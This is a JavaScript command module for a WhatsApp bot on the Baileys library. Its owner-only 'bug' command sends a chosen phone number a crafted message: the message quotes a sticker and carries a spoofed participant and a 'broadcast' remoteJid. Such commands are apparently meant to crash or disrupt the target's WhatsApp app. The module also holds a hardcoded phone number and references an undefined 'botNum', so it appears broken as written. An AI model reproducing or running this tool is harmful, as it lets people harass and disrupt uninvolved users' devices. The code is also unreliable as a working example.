import fs from 'fs-extra';
import { generateWAMessage, generateWAMessageFromContent } from '@adiwajshing/baileys';
import { ZERO, S_WHATSAPP_NET } from '../../helper/index.js';

/**
 * @type {import('../../types/Commands/index.js').CommandProps}
 */
export default {
	name: 'bug',
	description: 'Send bug.',
	category: 'Debugging',
	usage: '!bug',
	aliases: ['bug'],
	cooldown: 5,
	limit: 0,
	status: 'enable',
	async run({ from, bodyQuoted, mediaData, query, isOwner }, client) {
		if (!query && !bodyQuoted) {
			return;
		}

		if (!isOwner) {
			return;
		}

		const message = await generateWAMessage(
			'6289522534401@s.whatsapp.net',
			{ sticker: await fs.readFile('./src/media/blank.png') },
			{ upload: client[botNum].waUploadToServer }
		);

		const messages = generateWAMessageFromContent(
			from,
			{
				extendedTextMessage: {
					text: '.',
					contextInfo: {
						participant: ZERO,
						remoteJid: 'broadcast',
						quotedMessage: {
							stickerMessage: message.message.stickerMessage
						}
					}
				}
			},
			{}
		);

		await client[botNum].relayMessage(
			`${(query || mediaData.participant).replace(/([@s.+\s-]|whatsapp|net)/g, '')}${S_WHATSAPP_NET}`,
			messages.message,
			{
				messageId: messages.key.id
			}
		);
	}
};
